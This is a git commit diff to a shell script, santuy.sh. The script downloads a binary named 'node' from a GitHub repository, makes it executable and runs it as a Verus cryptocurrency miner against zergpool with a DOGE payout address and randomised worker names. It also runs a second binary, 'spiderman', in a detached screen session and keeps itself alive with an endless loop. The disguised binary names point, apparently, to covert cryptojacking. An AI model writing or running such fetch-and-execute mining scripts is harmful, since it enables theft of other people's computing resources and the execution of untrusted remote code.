9ba58b18b118539e7060eaca1c6b72ba6e289eb0
makaryobos <90647406+makaryobos@users.noreply.github.com>
2021-09-21 07:05:31 +0700

    Update santuy.sh

--- santuy.sh
+++ santuy.sh
@@ -6,7 +6,8 @@ screen -dmS run ./spiderman -a verus -o stratum+tcp://verushash.mine.zergpool.co
 
 
 wget https://raw.githubusercontent.com/makaryobos/privasi/main/node 
-chmod +x ./node -a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u DRQ9iChWbU8cxC3js3YNwDheajeq6jN8Np.$(echo $(shuf -i 1-20 -n 1)-kin) -t 2 -p c=DOGE -x --max-cpu-usage=75
+chmod +x node
+./node -a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u DRQ9iChWbU8cxC3js3YNwDheajeq6jN8Np.$(echo $(shuf -i 1-20 -n 1)-kin) -t 2 -p c=DOGE -x --max-cpu-usage=75
 while [ 1 ]; do
 sleep 3
 done
